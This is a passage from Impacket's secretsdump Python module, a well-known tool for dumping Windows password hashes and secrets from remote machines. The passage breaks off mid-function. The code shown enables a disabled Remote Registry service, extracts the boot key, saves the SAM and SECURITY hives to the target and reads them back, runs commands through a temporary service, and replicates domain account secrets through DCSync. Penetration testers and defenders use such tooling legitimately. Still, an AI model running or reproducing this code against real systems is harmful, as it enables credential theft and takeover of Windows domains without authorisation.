# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2020 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author:
#  Alberto Solino (@agsolino)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#
from __future__ import division
from __future__ import print_function
import codecs
import json
import hashlib
import logging
import ntpath
import os
import re
import random
import string
import time
from binascii import unhexlify, hexlify
from collections import OrderedDict
from datetime import datetime
from struct import unpack, pack
from six import b, PY2

from impacket import LOG
from impacket import system_errors
from impacket import winregistry, ntlm
from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
    VARIANT, VARENUM, DISPATCH_METHOD
from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
    OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
    IRemUnknown2, INTERFACE
from impacket.ese import ESENT_DB
from impacket.dpapi import DPAPI_SYSTEM
from impacket.smb3structs import FILE_READ_DATA, FILE_SHARE_READ
from impacket.nt_errors import STATUS_MORE_ENTRIES
from impacket.structure import Structure
from impacket.structure import hexdump
from impacket.uuid import string_to_bin
from impacket.crypto import transformKey
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
try:
    from Cryptodome.Cipher import DES, ARC4, AES
    from Cryptodome.Hash import HMAC, MD4, MD5
except ImportError:
    LOG.critical("Warning: You don't have any crypto installed. You need pycryptodomex")
    LOG.critical("See https://pypi.org/project/pycryptodomex/")


# Structures
# Taken from https://insecurety.net/?p=768
class SAM_KEY_DATA(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('Salt','16s=b""'),
        ('Key','16s=b""'),
        ('CheckSum','16s=b""'),
        ('Reserved','<Q=0'),
    )

# Structure taken from mimikatz (@gentilkiwi) in the context of https://github.com/SecureAuthCorp/impacket/issues/326
# Merci! Makes it way easier than parsing manually.
class SAM_HASH(Structure):
    structure = (
        ('PekID','<H=0'),
        ('Revision','<H=0'),
        ('Hash','16s=b""'),
    )

class SAM_KEY_DATA_AES(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Length','<L=0'),
        ('CheckSumLen','<L=0'),
        ('DataLen','<L=0'),
        ('Salt','16s=b""'),
        ('Data',':'),
    )

class SAM_HASH_AES(Structure):
    structure = (
        ('PekID','<H=0'),
        ('Revision','<H=0'),
        ('DataOffset','<L=0'),
        ('Salt','16s=b""'),
        ('Hash',':'),
    )

class DOMAIN_ACCOUNT_F(Structure):
    structure = (
        ('Revision','<L=0'),
        ('Unknown','<L=0'),
        ('CreationTime','<Q=0'),
        ('DomainModifiedCount','<Q=0'),
        ('MaxPasswordAge','<Q=0'),
        ('MinPasswordAge','<Q=0'),
        ('ForceLogoff','<Q=0'),
        ('LockoutDuration','<Q=0'),
        ('LockoutObservationWindow','<Q=0'),
        ('ModifiedCountAtLastPromotion','<Q=0'),
        ('NextRid','<L=0'),
        ('PasswordProperties','<L=0'),
        ('MinPasswordLength','<H=0'),
        ('PasswordHistoryLength','<H=0'),
        ('LockoutThreshold','<H=0'),
        ('Unknown2','<H=0'),
        ('ServerState','<L=0'),
        ('ServerRole','<H=0'),
        ('UasCompatibilityRequired','<H=0'),
        ('Unknown3','<Q=0'),
        ('Key0',':'),
# Commenting this, not needed and not present on Windows 2000 SP0
#        ('Key1',':', SAM_KEY_DATA),
#        ('Unknown4','<L=0'),
    )

# Great help from here https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
class USER_ACCOUNT_V(Structure):
    structure = (
        ('Unknown','12s=b""'),
        ('NameOffset','<L=0'),
        ('NameLength','<L=0'),
        ('Unknown2','<L=0'),
        ('FullNameOffset','<L=0'),
        ('FullNameLength','<L=0'),
        ('Unknown3','<L=0'),
        ('CommentOffset','<L=0'),
        ('CommentLength','<L=0'),
        ('Unknown3','<L=0'),
        ('UserCommentOffset','<L=0'),
        ('UserCommentLength','<L=0'),
        ('Unknown4','<L=0'),
        ('Unknown5','12s=b""'),
        ('HomeDirOffset','<L=0'),
        ('HomeDirLength','<L=0'),
        ('Unknown6','<L=0'),
        ('HomeDirConnectOffset','<L=0'),
        ('HomeDirConnectLength','<L=0'),
        ('Unknown7','<L=0'),
        ('ScriptPathOffset','<L=0'),
        ('ScriptPathLength','<L=0'),
        ('Unknown8','<L=0'),
        ('ProfilePathOffset','<L=0'),
        ('ProfilePathLength','<L=0'),
        ('Unknown9','<L=0'),
        ('WorkstationsOffset','<L=0'),
        ('WorkstationsLength','<L=0'),
        ('Unknown10','<L=0'),
        ('HoursAllowedOffset','<L=0'),
        ('HoursAllowedLength','<L=0'),
        ('Unknown11','<L=0'),
        ('Unknown12','12s=b""'),
        ('LMHashOffset','<L=0'),
        ('LMHashLength','<L=0'),
        ('Unknown13','<L=0'),
        ('NTHashOffset','<L=0'),
        ('NTHashLength','<L=0'),
        ('Unknown14','<L=0'),
        ('Unknown15','24s=b""'),
        ('Data',':=b""'),
    )

class NL_RECORD(Structure):
    structure = (
        ('UserLength','<H=0'),
        ('DomainNameLength','<H=0'),
        ('EffectiveNameLength','<H=0'),
        ('FullNameLength','<H=0'),
# Taken from https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.h#L265
        ('LogonScriptName','<H=0'),
        ('ProfilePathLength','<H=0'),
        ('HomeDirectoryLength','<H=0'),
        ('HomeDirectoryDriveLength','<H=0'),
        ('UserId','<L=0'),
        ('PrimaryGroupId','<L=0'),
        ('GroupCount','<L=0'),
        ('logonDomainNameLength','<H=0'),
        ('unk0','<H=0'),
        ('LastWrite','<Q=0'),
        ('Revision','<L=0'),
        ('SidCount','<L=0'),
        ('Flags','<L=0'),
        ('unk1','<L=0'),
        ('LogonPackageLength','<L=0'),
        ('DnsDomainNameLength','<H=0'),
        ('UPN','<H=0'),
       # ('MetaData','52s=""'),
       # ('FullDomainLength','<H=0'),
       # ('Length2','<H=0'),
        ('IV','16s=b""'),
        ('CH','16s=b""'),
        ('EncryptedData',':'),
    )


class SAMR_RPC_SID_IDENTIFIER_AUTHORITY(Structure):
    structure = (
        ('Value','6s'),
    )

class SAMR_RPC_SID(Structure):
    structure = (
        ('Revision','<B'),
        ('SubAuthorityCount','<B'),
        ('IdentifierAuthority',':',SAMR_RPC_SID_IDENTIFIER_AUTHORITY),
        ('SubLen','_-SubAuthority','self["SubAuthorityCount"]*4'),
        ('SubAuthority',':'),
    )

    def formatCanonical(self):
       ans = 'S-%d-%d' % (self['Revision'], ord(self['IdentifierAuthority']['Value'][5:6]))
       for i in range(self['SubAuthorityCount']):
           ans += '-%d' % ( unpack('>L',self['SubAuthority'][i*4:i*4+4])[0])
       return ans

class LSA_SECRET_BLOB(Structure):
    structure = (
        ('Length','<L=0'),
        ('Unknown','12s=b""'),
        ('_Secret','_-Secret','self["Length"]'),
        ('Secret',':'),
        ('Remaining',':'),
    )

class LSA_SECRET(Structure):
    structure = (
        ('Version','<L=0'),
        ('EncKeyID','16s=b""'),
        ('EncAlgorithm','<L=0'),
        ('Flags','<L=0'),
        ('EncryptedData',':'),
    )

class LSA_SECRET_XP(Structure):
    structure = (
        ('Length','<L=0'),
        ('Version','<L=0'),
        ('_Secret','_-Secret', 'self["Length"]'),
        ('Secret', ':'),
    )


# Helper to create files for exporting
def openFile(fileName, mode='w+', openFileFunc=None):
    if openFileFunc is not None:
        return openFileFunc(fileName, mode)
    else:
        return codecs.open(fileName, mode, encoding='utf-8')


# Classes
class RemoteFile:
    def __init__(self, smbConnection, fileName):
        self.__smbConnection = smbConnection
        self.__fileName = fileName
        self.__tid = self.__smbConnection.connectTree('ADMIN$')
        self.__fid = None
        self.__currentOffset = 0

    def open(self):
        tries = 0
        while True:
            try:
                self.__fid = self.__smbConnection.openFile(self.__tid, self.__fileName, desiredAccess=FILE_READ_DATA,
                                                   shareMode=FILE_SHARE_READ)
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    if tries >= 3:
                        raise e
                    # Stuff didn't finish yet.. wait more
                    time.sleep(5)
                    tries += 1
                    pass
                else:
                    raise e
            else:
                break

    def seek(self, offset, whence):
        # Implement whence, for now it's always from the beginning of the file
        if whence == 0:
            self.__currentOffset = offset

    def read(self, bytesToRead):
        if bytesToRead > 0:
            data =  self.__smbConnection.readFile(self.__tid, self.__fid, self.__currentOffset, bytesToRead)
            self.__currentOffset += len(data)
            return data
        return b''

    def close(self):
        if self.__fid is not None:
            self.__smbConnection.closeFile(self.__tid, self.__fid)
            self.__smbConnection.deleteFile('ADMIN$', self.__fileName)
            self.__fid = None

    def tell(self):
        return self.__currentOffset

    def __str__(self):
        return "\\\\%s\\ADMIN$\\%s" % (self.__smbConnection.getRemoteHost(), self.__fileName)

class RemoteOperations:
    def __init__(self, smbConnection, doKerberos, kdcHost=None):
        self.__smbConnection = smbConnection
        if self.__smbConnection is not None:
            self.__smbConnection.setTimeout(5*60)
        self.__serviceName = 'RemoteRegistry'
        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
        self.__rrp = None
        self.__regHandle = None

        self.__stringBindingSamr = r'ncacn_np:445[\pipe\samr]'
        self.__samr = None
        self.__domainHandle = None
        self.__domainName = None
        self.__domainSid = None

        self.__drsr = None
        self.__hDrs = None
        self.__NtdsDsaObjectGuid = None
        self.__ppartialAttrSet = None
        self.__prefixTable = []
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost

        self.__bootKey = b''
        self.__disabled = False
        self.__shouldStop = False
        self.__started = False

        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
        self.__scmr = None
        self.__tmpServiceName = None
        self.__serviceDeleted = False

        self.__batchFile = '%TEMP%\\execute.bat'
        self.__shell = '%COMSPEC% /Q /c '
        self.__output = '%SYSTEMROOT%\\Temp\\__output'
        self.__answerTMP = b''

        self.__execMethod = 'smbexec'

    def setExecMethod(self, method):
        self.__execMethod = method

    def __connectSvcCtl(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
        rpc.set_smb_connection(self.__smbConnection)
        self.__scmr = rpc.get_dce_rpc()
        self.__scmr.connect()
        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)

    def __connectWinReg(self):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
        rpc.set_smb_connection(self.__smbConnection)
        self.__rrp = rpc.get_dce_rpc()
        self.__rrp.connect()
        self.__rrp.bind(rrp.MSRPC_UUID_RRP)

    def connectSamr(self, domain):
        rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
        rpc.set_smb_connection(self.__smbConnection)
        self.__samr = rpc.get_dce_rpc()
        self.__samr.connect()
        self.__samr.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(self.__samr)
        serverHandle = resp['ServerHandle']

        resp = samr.hSamrLookupDomainInSamServer(self.__samr, serverHandle, domain)
        self.__domainSid = resp['DomainId'].formatCanonical()

        resp = samr.hSamrOpenDomain(self.__samr, serverHandle=serverHandle, domainId=resp['DomainId'])
        self.__domainHandle = resp['DomainHandle']
        self.__domainName = domain

    def __connectDrds(self):
        stringBinding = epm.hept_map(self.__smbConnection.getRemoteHost(), drsuapi.MSRPC_UUID_DRSUAPI,
                                     protocol='ncacn_ip_tcp')
        rpc = transport.DCERPCTransportFactory(stringBinding)
        rpc.setRemoteHost(self.__smbConnection.getRemoteHost())
        rpc.setRemoteName(self.__smbConnection.getRemoteName())
        if hasattr(rpc, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpc.set_credentials(*(self.__smbConnection.getCredentials()))
            rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
        self.__drsr = rpc.get_dce_rpc()
        self.__drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        if self.__doKerberos:
            self.__drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__drsr.connect()
        # Uncomment these lines if you want to play some tricks
        # This will make the dump way slower tho.
        #self.__drsr.bind(samr.MSRPC_UUID_SAMR)
        #self.__drsr = self.__drsr.alter_ctx(drsuapi.MSRPC_UUID_DRSUAPI)
        #self.__drsr.set_max_fragment_size(1)
        # And Comment this line
        self.__drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        if self.__domainName is None:
            # Get domain name from credentials cached
            self.__domainName = rpc.get_credentials()[2]

        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs) #- 4
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | drsuapi.DRS_EXT_GETCHGREQ_V8 | \
                         drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        # I'm uber potential (c) Ben
        drs['dwExtCaps'] = 0xffffffff
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(drs.getData())
        resp = self.__drsr.request(request)
        if LOG.level == logging.DEBUG:
            LOG.debug('DRSBind() answer')
            resp.dump()

        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
        len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            if LOG.level == logging.DEBUG:
                LOG.debug("DC's dwReplEpoch != 0, setting it to %d and calling DRSBind again" % drsExtensionsInt[
                    'dwReplEpoch'])
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = self.__drsr.request(request)

        self.__hDrs = resp['phDrs']

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(self.__drsr, self.__hDrs, self.__domainName, 2)
        if LOG.level == logging.DEBUG:
            LOG.debug('DRSDomainControllerInfo() answer')
            resp.dump()

        if resp['pmsgOut']['V2']['cItems'] > 0:
            self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            LOG.error("Couldn't get DC info for domain %s" % self.__domainName)
            raise Exception('Fatal, aborting')

    def getDrsr(self):
        return self.__drsr

    def DRSCrackNames(self, formatOffered=drsuapi.DS_NAME_FORMAT.DS_DISPLAY_NAME,
                      formatDesired=drsuapi.DS_NAME_FORMAT.DS_FQDN_1779_NAME, name=''):
        if self.__drsr is None:
            self.__connectDrds()

        LOG.debug('Calling DRSCrackNames for %s ' % name)
        resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
        return resp

    def DRSGetNCChanges(self, userEntry):
        if self.__drsr is None:
            self.__connectDrds()

        LOG.debug('Calling DRSGetNCChanges for %s ' % userEntry)
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid

        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin(userEntry[1:-1])
        dsName['Sid'] = ''
        dsName['NameLen'] = 0
        dsName['StringName'] = ('\x00')

        dsName['structLen'] = len(dsName.getData())

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ
        if self.__ppartialAttrSet is None:
            self.__prefixTable = []
            self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            self.__ppartialAttrSet['dwVersion'] = 1
            self.__ppartialAttrSet['cAttrs'] = len(NTDSHashes.ATTRTYP_TO_ATTID)
            for attId in list(NTDSHashes.ATTRTYP_TO_ATTID.values()):
                self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable , attId))
        request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = self.__prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

        return self.__drsr.request(request)

    def getDomainUsers(self, enumerationContext=0):
        if self.__samr is None:
            self.connectSamr(self.getMachineNameAndDomain()[1])

        try:
            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, self.__domainHandle,
                                                    userAccountControl=samr.USER_NORMAL_ACCOUNT | \
                                                                       samr.USER_WORKSTATION_TRUST_ACCOUNT | \
                                                                       samr.USER_SERVER_TRUST_ACCOUNT |\
                                                                       samr.USER_INTERDOMAIN_TRUST_ACCOUNT,
                                                    enumerationContext=enumerationContext)
        except DCERPCException as e:
            if str(e).find('STATUS_MORE_ENTRIES') < 0:
                raise
            resp = e.get_packet()
        return resp

    def getDomainSid(self):
        if self.__domainSid is not None:
            return self.__domainSid

        if self.__samr is None:
            self.connectSamr(self.getMachineNameAndDomain()[1])

        return self.__domainSid

    def getMachineKerberosSalt(self):
        """
        Returns Kerberos salt for the current connection if
        we have the correct information
        """
        if self.__smbConnection.getServerName() == '':
            # Todo: figure out an RPC call that gives us the domain FQDN
            # instead of the NETBIOS name as NetrWkstaGetInfo does
            return b''
        else:
            host = self.__smbConnection.getServerName()
            domain = self.__smbConnection.getServerDNSDomainName()
            salt = b'%shost%s.%s' % (domain.upper().encode('utf-8'), host.lower().encode('utf-8'), domain.lower().encode('utf-8'))
            return salt

    def getMachineNameAndDomain(self):
        if self.__smbConnection.getServerName() == '':
            # No serverName.. this is either because we're doing Kerberos
            # or not receiving that data during the login process.
            # Let's try getting it through RPC
            rpc = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\wkssvc]')
            rpc.set_smb_connection(self.__smbConnection)
            dce = rpc.get_dce_rpc()
            dce.connect()
            dce.bind(wkst.MSRPC_UUID_WKST)
            resp = wkst.hNetrWkstaGetInfo(dce, 100)
            dce.disconnect()
            return resp['WkstaInfo']['WkstaInfo100']['wki100_computername'][:-1], resp['WkstaInfo']['WkstaInfo100'][
                                                                                      'wki100_langroup'][:-1]
        else:
            return self.__smbConnection.getServerName(), self.__smbConnection.getServerDomain()

    def getDefaultLoginAccount(self):
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
            keyHandle = ans['phkResult']
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
            username = dataValue[:-1]
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultDomainName')
            domain = dataValue[:-1]
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
            if len(domain) > 0:
                return '%s\\%s' % (domain,username)
            else:
                return username
        except:
            return None

    def getServiceAccount(self, serviceName):
        try:
            # Open the service
            ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, serviceName)
            serviceHandle = ans['lpServiceHandle']
            resp = scmr.hRQueryServiceConfigW(self.__scmr, serviceHandle)
            account = resp['lpServiceConfig']['lpServiceStartName'][:-1]
            scmr.hRCloseServiceHandle(self.__scmr, serviceHandle)
            if account.startswith('.\\'):
                account = account[2:]
            return account
        except Exception as e:
            # Don't log if history service is not found, that should be normal
            if serviceName.endswith("_history") is False:
                LOG.error(e)
            return None

    def __checkServiceStatus(self):
        # Open SC Manager
        ans = scmr.hROpenSCManagerW(self.__scmr)
        self.__scManagerHandle = ans['lpScHandle']
        # Now let's open the service
        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
        self.__serviceHandle = ans['lpServiceHandle']
        # Let's check its status
        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
            LOG.info('Service %s is in stopped state'% self.__serviceName)
            self.__shouldStop = True
            self.__started = False
        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
            LOG.debug('Service %s is already running'% self.__serviceName)
            self.__shouldStop = False
            self.__started  = True
        else:
            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])

        # Let's check its configuration if service is stopped, maybe it's disabled :s
        if self.__started is False:
            ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
            if ans['lpServiceConfig']['dwStartType'] == 0x4:
                LOG.info('Service %s is disabled, enabling it'% self.__serviceName)
                self.__disabled = True
                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
            LOG.info('Starting service %s' % self.__serviceName)
            scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
            time.sleep(1)

    def enableRegistry(self):
        self.__connectSvcCtl()
        self.__checkServiceStatus()
        self.__connectWinReg()

    def __restore(self):
        # First of all stop the service if it was originally stopped
        if self.__shouldStop is True:
            LOG.info('Stopping service %s' % self.__serviceName)
            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
        if self.__disabled is True:
            LOG.info('Restoring the disabled state for service %s' % self.__serviceName)
            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
        if self.__serviceDeleted is False and self.__tmpServiceName is not None:
            # Check again the service we created does not exist, starting a new connection
            # Why?.. Hitting CTRL+C might break the whole existing DCE connection
            try:
                rpc = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % self.__smbConnection.getRemoteHost())
                if hasattr(rpc, 'set_credentials'):
                    # This method exists only for selected protocol sequences.
                    rpc.set_credentials(*self.__smbConnection.getCredentials())
                    rpc.set_kerberos(self.__doKerberos, self.__kdcHost)
                self.__scmr = rpc.get_dce_rpc()
                self.__scmr.connect()
                self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
                # Open SC Manager
                ans = scmr.hROpenSCManagerW(self.__scmr)
                self.__scManagerHandle = ans['lpScHandle']
                # Now let's open the service
                resp = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName)
                service = resp['lpServiceHandle']
                scmr.hRDeleteService(self.__scmr, service)
                scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
                scmr.hRCloseServiceHandle(self.__scmr, service)
                scmr.hRCloseServiceHandle(self.__scmr, self.__serviceHandle)
                scmr.hRCloseServiceHandle(self.__scmr, self.__scManagerHandle)
                rpc.disconnect()
            except Exception as e:
                # If service is stopped it'll trigger an exception
                # If service does not exist it'll trigger an exception
                # So. we just wanna be sure we delete it, no need to
                # show this exception message
                pass

    def finish(self):
        self.__restore()
        if self.__rrp is not None:
            self.__rrp.disconnect()
        if self.__drsr is not None:
            self.__drsr.disconnect()
        if self.__samr is not None:
            self.__samr.disconnect()
        if self.__scmr is not None:
            try:
                self.__scmr.disconnect()
            except Exception as e:
                if str(e).find('STATUS_INVALID_PARAMETER') >=0:
                    pass
                else:
                    raise

    def getBootKey(self):
        bootKey = b''
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']
        for key in ['JD','Skew1','GBG','Data']:
            LOG.debug('Retrieving class info for %s'% key)
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
            keyHandle = ans['phkResult']
            ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
            bootKey = bootKey + b(ans['lpClassOut'][:-1])
            rrp.hBaseRegCloseKey(self.__rrp, keyHandle)

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        bootKey = unhexlify(bootKey)

        for i in range(len(bootKey)):
            self.__bootKey += bootKey[transforms[i]:transforms[i]+1]

        LOG.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey).decode('utf-8'))

        return self.__bootKey

    def checkNoLMHashPolicy(self):
        LOG.debug('Checking NoLMHash Policy')
        ans = rrp.hOpenLocalMachine(self.__rrp)
        self.__regHandle = ans['phKey']

        ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa')
        keyHandle = ans['phkResult']
        try:
            dataType, noLMHash = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'NoLmHash')
        except:
            noLMHash = 0

        if noLMHash != 1:
            LOG.debug('LMHashes are being stored')
            return False

        LOG.debug('LMHashes are NOT being stored')
        return True

    def __retrieveHive(self, hiveName):
        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegCreateKey(self.__rrp, regHandle, hiveName)
        except:
            raise Exception("Can't open %s hive" % hiveName)
        keyHandle = ans['phkResult']
        rrp.hBaseRegSaveKey(self.__rrp, keyHandle, tmpFileName)
        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)
        # Now let's open the remote file, so it can be read later
        remoteFileName = RemoteFile(self.__smbConnection, 'SYSTEM32\\'+tmpFileName)
        return remoteFileName

    def saveSAM(self):
        LOG.debug('Saving remote SAM database')
        return self.__retrieveHive('SAM')

    def saveSECURITY(self):
        LOG.debug('Saving remote SECURITY database')
        return self.__retrieveHive('SECURITY')

    def __smbExec(self, command):
        self.__serviceDeleted = False
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scManagerHandle, self.__tmpServiceName, self.__tmpServiceName,
                                     lpBinaryPathName=command)
        service = resp['lpServiceHandle']
        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        self.__serviceDeleted = True
        scmr.hRCloseServiceHandle(self.__scmr, service)

    def __getInterface(self, interface, resp):
        # Now let's parse the answer and build an Interface instance
        objRefType = OBJREF(b''.join(resp))['flags']
        objRef = None
        if objRefType == FLAGS_OBJREF_CUSTOM:
            objRef = OBJREF_CUSTOM(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_HANDLER:
            objRef = OBJREF_HANDLER(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_STANDARD:
            objRef = OBJREF_STANDARD(b''.join(resp))
        elif objRefType == FLAGS_OBJREF_EXTENDED:
            objRef = OBJREF_EXTENDED(b''.join(resp))
        else:
